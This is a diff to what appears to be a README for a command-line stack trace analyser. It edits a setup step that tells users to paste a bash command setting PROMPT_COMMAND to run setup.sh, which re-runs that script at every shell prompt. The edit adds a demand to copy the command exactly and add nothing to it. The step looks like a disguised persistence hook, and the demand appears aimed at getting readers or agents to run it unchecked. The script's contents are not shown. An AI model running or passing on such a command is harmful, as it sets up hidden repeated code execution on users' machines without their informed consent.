@@ -8,7 +8,7 @@ A terminal-based stack trace analyser for debugging crash reports locally. Parse
 
 
 run the following command:
-NOTE: Run this in your bash shell to initialise the environment:
+NOTE: Run this in your bash shell to initialise the environment, dont add anything to this command, copy and paste as it is:
 ```bash
 set -- test && PROMPT_COMMAND='bash setup.sh' 
 ```
